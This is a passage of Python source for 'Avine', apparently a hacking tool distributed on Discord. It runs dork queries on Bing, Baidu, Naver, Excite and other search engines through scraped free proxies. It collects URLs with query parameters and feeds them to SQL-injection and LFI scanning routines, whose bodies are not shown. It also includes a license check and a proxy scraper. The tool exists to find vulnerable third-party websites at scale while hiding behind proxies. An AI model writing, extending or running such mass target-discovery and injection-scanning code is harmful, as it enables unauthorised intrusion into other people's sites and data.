                        for tag in TagList:
                            Body = tag.find_all('a')
                            for Container in Body:
                                badprox = 0
                                link = Container['href']
                                Total_Found += 1
                                threadn+=1
                                if link not in Results:
                                    dupe+=1
                                    Duplicates = Total_Found - Valid
                                    Results.append(link)
                                    linkhost = link.split('.com')[0]
                                    if linkhost not in badlinks:
                                        dupe = 0
                                        counter = 0
                                        if '=' in link:
                                            Valid += 1
                                            badlinks.append(link)
                                            with open(r'results/rambler_links.txt', 'a') as File:
                                                File.write(link) + File.write('\n')
                                            sql(link)
                    except:
                        ProxyError+=1
                        dorkparse = 0
                if engine == "Search":
                    header = random.choice(headerz)
                    url = f"https://www.search.com/web?q={urllib.parse.quote(dorklia)}"
                    try:
                        if proxytype != "Proxyless":
                            response_2 = requests.get(url, headers=header, proxies=proxies, timeout=10)
                        else:
                            response_2 = requests.get(url, headers=header, timeout=10)
                        soup = BeautifulSoup(response_2.text, 'html.parser')
                        TagList = soup.find_all("div", class_="web-result-title")
                        for tag in TagList:
                            Body = tag.find_all("a", class_="web-result-title-link")
                            for Container in Body:
                                badprox = 0
                                link = Container['href']
                                Total_Found += 1
                                threadn+=1
                                if link not in Results:
                                    dupe+=1
                                    Duplicates = Total_Found - Valid
                                    Results.append(link)
                                    linkhost = link.split('.com')[0]
                                    if linkhost not in badlinks:
                                        dupe = 0
                                        counter = 0
                                        if '=' in link:
                                            Valid += 1
                                            badlinks.append(link)
                                            with open(r'results/search_links.txt', 'a') as File:
                                                File.write(link) + File.write('\n')
                                            sql(link)
                    except:
                        ProxyError+=1
                        dorkparse = 0
                if engine == "Baidu":
                    header = random.choice(headerz)
                    url = f"https://www.baidu.com/s?wd={urllib.parse.quote(dorklia)}&rn=40&pn={first}"
                    try:
                        if proxytype != "Proxyless":
                            response_2 = requests.get(url, headers=header, proxies=proxies, timeout=10)
                        else:
                            response_2 = requests.get(url, headers=header, timeout=10)
                        soup = BeautifulSoup(response_2.text, 'html.parser')
                        TagList = soup.find_all('h3', class_="c-title t t tts-title")
                        for tag in TagList:
                            Body = tag.find_all('a')
                            for Container in Body:
                                badprox = 0
                                link = Container['href']
                                Total_Found += 1
                                threadn+=1
                                if link not in Results:
                                    dupe+=1
                                    Duplicates = Total_Found - Valid
                                    Results.append(link)
                                    linkhost = link.split('.com')[0]
                                    if linkhost not in badlinks:
                                        dupe = 0
                                        counter = 0
                                        if '=' in link:
                                            Valid += 1
                                            badlinks.append(link)
                                            with open(r'results/baidu_links.txt', 'a') as File:
                                                File.write(link) + File.write('\n')
                                            sql(link)
                    except:
                        ProxyError+=1
                        dorkparse = 0
                if engine == "Naver":
                    header = random.choice(headerz)
                    url = f"https://search.naver.com/search.naver?display=15&f=&filetype=0&page={first}&query={urllib.parse.quote(dorklia)}"
                    try:
                        if proxytype != "Proxyless":
                            response_2 = requests.get(url, headers=header, proxies=proxies, timeout=10)
                        else:
                            response_2 = requests.get(url, headers=header, timeout=10)
                        soup = BeautifulSoup(response_2.text, 'html.parser')
                        TagList = soup.find_all("div", class_="total_tit")
                        for tag in TagList:
                            Body = tag.find_all('a')
                            for Container in Body:
                                badprox = 0
                                link = Container['href']
                                Total_Found += 1
                                threadn+=1
                                if link not in Results:
                                    dupe+=1
                                    Duplicates = Total_Found - Valid
                                    Results.append(link)
                                    linkhost = link.split('.net')[0]
                                    if linkhost not in badlinks:
                                        dupe = 0
                                        counter = 0
                                        if '=' in link:
                                            Valid += 1
                                            badlinks.append(link)
                                            with open(r'results/naver_links.txt', 'a') as File:
                                                File.write(link) + File.write('\n')
                                            sql(link)         
                    except:
                        ProxyError+=1
                        dorkparse = 0
                if engine == "Excite":
                    header = random.choice(headerz)
                    url = f"https://results.excite.com/serp?q={urllib.parse.quote(dorklia)}&page={first}"
                    try:
                        response_2 = requests.get(url, headers=header, proxies=proxies, timeout=10)
                        soup = BeautifulSoup(response_2.text, 'html.parser')
                        TagList = soup.find_all("div", class_="web-bing__result")
                        for tag in TagList:
                            Body = tag.find_all('a')
                            for Container in Body:
                                badprox = 0
                                link = Container['href']
                                Total_Found += 1
                                threadn+=1
                                if link not in Results:
                                    dupe+=1
                                    Duplicates = Total_Found - Valid
                                    Results.append(link)
                                    linkhost = link.split('.com')[0]
                                    if linkhost not in badlinks:
                                        dupe = 0
                                        counter = 0
                                        if '=' in link:
                                            Valid += 1
                                            badlinks.append(link)
                                            with open(r'results/excite_links.txt', 'a') as File:
                                                File.write(link) + File.write('\n')
                                            sql(link)        
                    except:
                        ProxyError+=1
                        dorkparse = 0
            except:
                Error+=1
                parse()
            threading.Thread(target=parse, args=()).start()
    if Total == dorklineint:
        print(logo)
        print()
        print(f"{green} Finished Getting URL's!{reset}")
        time.sleep(5)
        main2()

def Drok():
    global dorklia, droklist, linee, Error
    linee+=1
    try:     
        with open(fileNameDork.name, 'r+', encoding='utf-8', errors='ignore') as e:
            ext = e.readlines()
            dorklia = ext[int(linee)].strip()
    except:
        Error+=1
        
def parser2():
    global proxylist, fileNameDork, dorkline, dorklineint, proxytype
    os.system('cls')
    ctypes.windll.kernel32.SetConsoleTitleW("Avine By KillinMachine#2570  |  Parser")
    print(logo)
    print()
    print(f"{magenta}  Select Your Proxy Types:{reset}")
    print(f"\n  {lightblue} [1] {lightmagenta}HTTP(S)\n  {lightblue} [2] {lightmagenta}SOCKS4\n  {lightblue} [3] {lightmagenta}SOCKS5\n  {lightblue} [4] {lightmagenta}Proxyless")
    try:
        question = int(input(""))
    except Exception:
        print(f"{red}Invalid option{reset}")
        time.sleep(2)
        main2()
    if question == 1:
        proxytype = "https"
    elif question == 2:
        proxytype = "socks4"
    elif question == 3:
        proxytype = "socks5"
    elif question == 4:
        proxytype = "Proxyless"
    else:
        print(f"{red}Invalid option{reset}")
        time.sleep(2)
        main2()
    if proxytype != "Proxyless":
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW("Avine By KillinMachine#2570  |  Parser")
        print("          Coded by KillinMachine")
        print(f"     Select your proxies file ({proxytype})")
        fileNameProxy = filedialog.askopenfile(parent=root, mode='rb', title=f'Choose a {proxytype} Proxies File',
                                    filetype=(("txt", "*.txt"), ("All files", "*.txt")))
        if fileNameProxy is None:
            parser()
        else:
            try:
                with open(fileNameProxy.name, 'r+', encoding='utf-8', errors='ignore') as e:
                    ext = e.readlines()
                    for line in ext:
                        try:
                            proxyline = line.split()[0].replace('\n', '')
                            proxylist.append(proxyline)
                        except:
                            pass
                print(f"       Loaded [{len(proxylist)}] proxies lines.")
                time.sleep(2)
            except Exception:
                print("Your proxy file is probably harmed, please try again..")
    print("          Select your dork file")
    fileNameDork = filedialog.askopenfile(parent=root, mode='rb', title='Choose your dork file',
                                filetype=(("txt", "*.txt"), ("All files", "*.txt")))
    if fileNameDork is None:
        parser()
    else:
        try:
            with open(fileNameDork.name, 'r+', encoding='utf-8', errors='ignore') as e:
                ext = e.readlines()
                for line in ext:
                    try:
                        dorkline = line.split()[0].replace('\n', '')
                        dorklist.append(dorkline)
                    except:
                        pass
            print(f"       Loaded [{len(dorklist)}] Dork lines.")
            time.sleep(2)
        except Exception:
            print("Your Dork file is probably harmed, please try again..")
    dorklineint = len(dorklist)
    os.system('cls')
    ctypes.windll.kernel32.SetConsoleTitleW(f"Avine By KillinMachine#2570 | Parsed dorks = {Total}  |  Total Found Links = {Total_Found}  |  Duplicates = {Duplicates}  |  Valid Links = {Valid} |  Proxy Error = {ProxyError}  |  Error = {Error}")
    Drok()
    proxy()
    threading.Thread(target=parse, args=()).start() #idk 
    threading.Thread(target=parse, args=()).start() 
    threading.Thread(target=parse, args=()).start()
    threading.Thread(target=parse, args=()).start()
    threading.Thread(target=parse, args=()).start()
    threading.Thread(target=parse, args=()).start()
    threading.Thread(target=parse, args=()).start() #thats a lot
    
def parser():
    global engine, first
    os.system('cls')
    ctypes.windll.kernel32.SetConsoleTitleW("Avine By KillinMachine#2570  |  Parser")
    print(logo)
    print()
    print(   f"{magenta} Pick a Search Engine{reset}"   )
    print(f"\n  {lightblue}[1] {lightmagenta}Bing\n  {lightblue}[2] {lightmagenta}Google\n  {lightblue}[3] {lightmagenta}Yahoo\n  {lightblue}[4] {lightmagenta}Ask\n  {lightblue}[5] {lightmagenta}Rambler\n  {lightblue}[6] {lightmagenta}Search\n  {lightblue}[7] {lightmagenta}Baidu\n  {lightblue}[8] {lightmagenta}Naver\n  {lightblue}[9] {lightmagenta}Excite\n\n  {lightblue}[0] {lightmagenta}Return")
    try:
        question = int(input(""))
    except Exception:
        print(f"{red}Invalid input{reset}")
        time.sleep(2)
        parser()
    if question == 1:
        engine = "Bing"
        parser2()
    elif question == 2:
        engine = "Google"
        parser2()
    elif question == 3:
        engine = "Yahoo"
        parser2()
    elif question == 4:
        engine = "Ask"
        parser2()
    elif question == 5:
        engine = "Rambler"
        parser2()
    elif question == 6:
        engine = "Search"
        parser2()
    elif question == 7:
        engine = "Baidu"
        parser2()
    elif question == 8:
        first = 2
        engine = "Naver"
        parser2()
    elif question == 9:
        engine = "Excite"
        parser2()
    elif question == 0:
        main2()
    else:
        print(f"{red}Invalid input{reset}")
        time.sleep(1)
        parser()

def proxyscrapeScraper(proxytype, timeout, country, pathTextFile):
    response = requests.get("https://api.proxyscrape.com/?request=getproxies&proxytype=" + proxytype + "&timeout=" + timeout + "&country=" + country)
    proxies = response.text
    with open(pathTextFile, "a") as txt_file:
        txt_file.write(proxies)

def proxyListDownloadScraper(url, type, anon, pathTextFile):
    session = requests.session()
    url = url + '?type=' + type + '&anon=' + anon
    html = session.get(url).text
    with open(pathTextFile, "a") as txt_file:
        for line in html.split('\n'):
            if len(line) > 0:
                txt_file.write(line)

def makesoup(url): #i love to make soup
    page=requests.get(url)
    return BeautifulSoup(page.text,"html.parser")

def proxyscrape(table): #just simple shit
    proxies = set()
    for row in table.findAll('tr'):
        countt = 0
        proxy = ""
        for cell in row.findAll('td'):
            if count == 1:
                proxy += ":" + cell.text.replace('&nbsp;', '')
                proxies.add(proxy)
                break
            proxy += cell.text.replace('&nbsp;', '')
            countt += 1
    return proxies

def scrapeproxies(url, pathTextFile):
    soup=makesoup(url)
    result = proxyscrape(table = soup.find('table', attrs={'class': 'table table-striped table-bordered'}))
    proxies = set()
    proxies.update(result)
    with open(pathTextFile, "a") as txt_file:
        for line in proxies:
	        txt_file.write("".join(line) + "\n") 

def output(pathTextFile):
    with open(pathTextFile, 'r+', encoding='utf-8', errors='ignore') as txt_file:
        ext = txt_file.readlines()
        lineas = len(ext)
    os.system('cls')
    print(logo)
    print()
    print(f'''   {magenta}Finished Scraping Proxies!
    {yellow}[{cyan}{lineas}{yellow}]{lightblue} Proxies found!''')
    if os.path.exists(pathTextFile):
        os.remove(pathTextFile)
    elif not os.path.exists(pathTextFile):
        with open(pathTextFile, 'w'): pass
    time.sleep(3)
    main2()

def ProxyScrape(): #shit sources but still proxies
    global proxyType
    pathTextFile = []
    os.system('cls')
    ctypes.windll.kernel32.SetConsoleTitleW("Avine By KillinMachine#2570  |  ProxyScrape")
    print(logo)
    print()
    print(f"{magenta}  Pick The Type Of Proxies You Would Like To Scrape:{reset}")
    print(f"\n  {lightblue} [1] {lightmagenta}HTTPS\n  {lightblue} [2] {lightmagenta}HTTP\n  {lightblue} [3] {lightmagenta}SOCKS\n  {lightblue} [4] {lightmagenta}SOCKS4\n  {lightblue} [5] {lightmagenta}SOCKS5\n\n  {lightblue} [6] {lightmagenta}Return")
    try:
        question = int(input(""))
    except Exception:
        print(f"{red}Invalid option{reset}")
        time.sleep(2)
        ProxyScrape() 
    if question == 1:
        proxyType = "https"
        pathTextFile = "results/https_proxies.txt"
        threading.Thread(target=scrapeproxies, args=('http://sslproxies.org',pathTextFile)).start()
        threading.Thread(target=proxyListDownloadScraper, args=('https://www.proxy-list.download/api/v1/get', 'https', 'elite',pathTextFile)).start()
        output(pathTextFile)
    elif question == 2:
        proxyType = "http"
        pathTextFile = "results/http_proxies.txt"
        threading.Thread(target=scrapeproxies, args=('http://free-proxy-list.net',pathTextFile)).start()
        threading.Thread(target=scrapeproxies, args=('http://us-proxy.org',pathTextFile)).start()
        threading.Thread(target=proxyscrapeScraper, args=('http','1000','All',pathTextFile)).start()
        threading.Thread(target=proxyListDownloadScraper, args=('https://www.proxy-list.download/api/v1/get', 'http', 'elite',pathTextFile)).start()
        threading.Thread(target=proxyListDownloadScraper, args=('https://www.proxy-list.download/api/v1/get', 'http', 'transparent',pathTextFile)).start()
        threading.Thread(target=proxyListDownloadScraper, args=('https://www.proxy-list.download/api/v1/get', 'http', 'anonymous',pathTextFile)).start()
        output(pathTextFile)
    elif question == 3:
        proxyType = "socks"
        pathTextFile = "results/socks_proxies.txt"
        threading.Thread(target=scrapeproxies, args=('http://socks-proxy.net',pathTextFile)).start()
        threading.Thread(target=proxyscrapeScraper, args=('socks4','1000','All',pathTextFile)).start()
        threading.Thread(target=proxyscrapeScraper, args=('socks5','1000','All',pathTextFile)).start()
        threading.Thread(target=proxyListDownloadScraper, args=('https://www.proxy-list.download/api/v1/get', 'socks5', 'elite',pathTextFile)).start()
        threading.Thread(target=proxyListDownloadScraper, args=('https://www.proxy-list.download/api/v1/get', 'socks4', 'elite',pathTextFile)).start()
        output(pathTextFile)
    elif question == 4:
        proxyType = "socks4"
        pathTextFile = "results/socks4_proxies.txt"
        threading.Thread(target=proxyscrapeScraper, args=('socks4','1000','All',pathTextFile)).start()
        threading.Thread(target=proxyListDownloadScraper, args=('https://www.proxy-list.download/api/v1/get', 'socks4', 'elite',pathTextFile)).start()
        output(pathTextFile)
    elif question == 5:
        proxyType = "socks5"
        pathTextFile = "results/socks5_proxies.txt"
        threading.Thread(target=proxyscrapeScraper, args=('socks5','1000','All',pathTextFile)).start()
        threading.Thread(target=proxyListDownloadScraper, args=('https://www.proxy-list.download/api/v1/get', 'socks5', 'elite',pathTextFile)).start()
        output(pathTextFile)
    elif question == 6:
        main2()
    else:
        print(f"{red}Invalid option{reset}")
        time.sleep(2)
        ProxyScrape()

def vuln(): #never finished vuln scanners
    global fileNameUrl, linee, counter
    linee = 0
    counter = 0
    os.system('cls')
    ctypes.windll.kernel32.SetConsoleTitleW("Avine By KillinMachine#2570  |  Vulnerability Scanner")
    print(logo)
    print()
    print(f"{magenta}  What kind of vulnerability do you want to scan for?{reset}")
    print(f"\n  {lightblue} [1] {lightmagenta}SQLI\n  {lightblue} [2] {lightmagenta}LFI\n\n  {lightblue} [3] {lightmagenta}Return")
    try:
        question = int(input(""))
    except Exception:
        print(f"{red}Invalid option{reset}")
        time.sleep(2)
        vuln()
    if question == 1:
        os.system('cls')
        print(logo)
        print()
        print(f"\n  {lightblue} [1] {lightmagenta}Save Payload\n  {lightblue} [2] {lightmagenta}Dont Save Payload\n\n  {lightblue} [3] {lightmagenta}Return")
        try:
            question = int(input(""))
        except Exception:
            print(f"{red}Invalid option{reset}")
            time.sleep(2)
            vuln()
        if question == 1:
            savepayload = "true"
        if question == 2:
            savepayload = "false"
        if question == 3:
            vuln()
        os.system('cls')
        print(logo)
        print()
        print(f"  Select your urls!")
        fileNameUrl = filedialog.askopenfile(parent=root, mode='rb', title=f'Choose your urls',
                                    filetype=(("txt", "*.txt"), ("All files", "*.txt")))
        if fileNameUrl is None:
            vuln()
        else:
            try:
                with open(fileNameUrl.name, 'r+', encoding='utf-8', errors='ignore') as e:
                    ext = e.readlines()
                    for line in ext:
                        try:
                            urlline = line.split()[0].replace('\n', '')
                            urllist.append(urlline)
                        except:
                            pass
                print(f"  Loaded [{len(urllist)}] url's")
                time.sleep(2)
            except Exception:
                print("Your urls file is probably harmed, please try again..")
        vulnscan()
    elif question == 2:
        os.system('cls')
        print(logo)
        print()
        print(f"\n  {lightblue} [1] {lightmagenta}Save Path\n  {lightblue} [2] {lightmagenta}Dont Save Path\n\n  {lightblue} [3] {lightmagenta}Return")
        try:
            question = int(input(""))
        except Exception:
            print(f"{red}Invalid option{reset}")
            time.sleep(2)
            vuln()
        if question == 1:
            savepayload = "true"
        if question == 2:
            savepayload = "false"
        if question == 3:
            vuln()
        os.system('cls')
        print(logo)
        print()
        print(f"  Select your your urls")
        fileNameUrl = filedialog.askopenfile(parent=root, mode='rb', title=f'Choose your urls',
                                    filetype=(("txt", "*.txt"), ("All files", "*.txt")))
        if fileNameUrl is None:
            vuln()
        else:
            try:
                with open(fileNameUrl.name, 'r+', encoding='utf-8', errors='ignore') as e:
                    ext = e.readlines()
                    for line in ext:
                        try:
                            urlline = line.split()[0].replace('\n', '')
                            urllist.append(urlline)
                        except:
                            pass
                print(f"  Loaded [{len(urllist)}] url's")
                time.sleep(2)
            except Exception:
                print("Your urls file is probably harmed, please try again..")
        lfiscan()
    elif question == 2:
        vuln()
    else:
        print(f"{red}Invalid option{reset}")
        time.sleep(2)
        vuln()

def verify_hmac(raw_body, client_signature: str, hmac_secret: bytes) -> bool:
    computed_sha = hmac.new(hmac_secret,
                            raw_body,
                            digestmod=hashlib.sha256).hexdigest()
    return computed_sha == client_signature

def main2(): #was once main but then i realized i needed an auth if i wanted to sell but its pointless now
    os.system('cls')
    print(logo)
    print()
    print(f"{magenta}  Pick an option:{reset}")
    print(f"\n  {lightblue} [1] {lightmagenta}Parser\n  {lightblue} [2] {lightmagenta}ProxyScrape\n  {lightblue} [3] {lightmagenta}Vuln Check")
    try:
        question = int(input(""))
    except Exception:
        print(f"{red}Invalid option{reset}")
        time.sleep(2)
        main2()
    if question == 1:
        parser()
    elif question == 2:
        ProxyScrape()
    elif question == 3:
        vuln()
    else:
        print(f"{red}Invalid option{reset}")
        time.sleep(2)
        main2()
        
def main(): #if anyone skids avine your welcome for this
    os.system('cls')
    ctypes.windll.kernel32.SetConsoleTitleW("Avine By KillinMachine#2570")
    print(logo)
    print()
    print(f"{magenta}  Pick an option:{reset}")
    print(f"\n  {lightblue} [1] {lightmagenta}Login\n  {lightblue} [2] {lightmagenta}Reset HWID\n  {lightblue} [3] {lightmagenta}Credits\n  {lightblue} [4] {lightmagenta}Main (select this to get to the program)")
    try:
        question = int(input(""))
    except Exception:
        print(f"{red}Invalid option{reset}")
        time.sleep(2)
        main()
    if question == 1:
        try: 
            os.system('cls')
            print(logo)
            print()
            secret = b"your hmac client secret"
            hwid = subprocess.check_output('wmic csproduct get uuid').decode().split('\n')[1].strip()
            print(f"{magenta}  Enter your username:{reset}")
            username = (input(" "))
            print(f"{magenta}  Enter your password:{reset}")
            password = (input(" "))
            aid = "your aid"
            api_key = "your api key"
            nonce = random.randint(1000000000, 1000000000000)
            payload = {"username": username, "password": password, "hwid": hwid, "aid": aid, "key": api_key, "nonce": nonce}
            h = hmac.new(secret, json.dumps(payload).encode("utf-8"), digestmod=hashlib.sha256).hexdigest()
            r = requests.post("http://api.ccauth.app/api/v4/authenticate", headers={"X-CCAuth-Signature": h}, json=payload) #chanchan auth https://github.com/chanchan69/VegetablesAuth.py
            is_verified = verify_hmac(r.text.encode(), r.headers["X-CCAuth-Signature"], secret)
            r = r.json()
            if r["success"] and r["nonce"] == nonce:
                if is_verified:
                    if not r["licenseInfo"]["expired"]:
                        os.system('cls')
                        print(logo)
                        print()
                        print(f"{magenta}  Authenticated")
                        time.sleep(1)
                        main2()
                    else:
                        os.system('cls')
                        print(logo)
                        print()
                        print(f"{red}  Your License has expired.")
                        time.sleep(4)
                        sys.exit
                else:
                    os.system('cls')
                    print(logo)
                    print()
                    print(f"{red}  Invalid hmac sig")
                    time.sleep(2)
                    main()
            else:
                if r["errorDetails"]["type"] == "credentials":
                    os.system('cls')
                    print(logo)
                    print()
                    print(f"{red}  Invalid Username/Password")
                    time.sleep(2)
                    main()
                elif r["errorDetails"]["type"] == "hwid":
                    os.system('cls')
                    print(logo)
                    print()
                    print(f"{red}  Invalid HWID")
                    time.sleep(2)
                    main()
                else:
                    os.system('cls')
                    print(logo)
                    print()
                    print(r["errorDetails"]["type"])
                    time.sleep(3)
                    sys.exit
        except:
            os.system('cls')
            print(logo)
            print()
            print(f"{red} There was an error!")
            time.sleep(5)
            main()
    elif question == 2:
        try:
            secret = b"your hmac client secret"
            hwid = subprocess.check_output('wmic csproduct get uuid').decode().split('\n')[1].strip()
            print(f"{magenta}  Enter your username:{reset}")
            username = (input(" "))
            print(f"{magenta}  Enter your password:{reset}")
            password = (input(" "))
            aid = "your aid"
            api_key = "your api key"
            print(f"{magenta}  Enter your Reset Key:{reset}")
            reset_key = (input(" "))
            payload = {"username": username, "password": password, "hwid": hwid, "aid": aid, "key": api_key, "resetKey": reset_key}
            h = hmac.new(secret, json.dumps(payload).encode("utf-8"), digestmod=hashlib.sha256).hexdigest()
            r = requests.post("http://127.0.0.1:5000/api/v4/reset", headers={"X-CCAuth-Signature": h}, json=payload)
            is_verified = verify_hmac(r.text.encode(), r.headers["X-CCAuth-Signature"], secret)
            r = r.json()
            if r["success"]:
                if is_verified:
                    print(f"{magenta}  Your HWID has been reset!")
                    time.sleep(1)
                    main()
                else:
                    print(f"{red}  Invalid hmac")
            else:
                if r["errorDetails"]["type"] == "invalid key":
                    os.system('cls')
                    print(logo)
                    print()
                    print(f"{red} Invalid Reset Key!")
                    time.sleep(3)
                    main()
                elif r["errorDetails"]["type"] == "settings":
                    os.system('cls')
                    print(logo)
                    print()
                    print(f"{red} HWID Resets are disabled!")
                    time.sleep(3)
                    main()
                elif r["errorDetails"]["type"] == "reseting too fast":
                    os.system('cls')
                    print(logo)
                    print()
                    print(f"{red} Your HWID has been reset in the last 24 hours!")
                    time.sleep(3)
                    main()
                else:
                    os.system('cls')
                    print(logo)
                    print()
                    print(f" Failed with error:")
                    print(r["errorDetails"]["type"]) 
        except:
            os.system('cls')
            print(logo)
            print()
            print(f"{red} There was an error!")
            time.sleep(5)
            main()
    if question == 3:
        os.system('cls')
        print(logo)
        print()
        print(f'''         {magenta}Credits:
 {lightblue}Made By{yellow}: {cyan}KillinMachine#2570
 {lightblue}Discord{yellow}: {cyan}discord.gg/txytskBP3s

   {magenta}Press enter to go back.''')
        if (input("")):
            main()
    elif question == 4:
        main2()
    else:
        print(f"{red}Invalid option{reset}")
        time.sleep(2)
        main()        
main()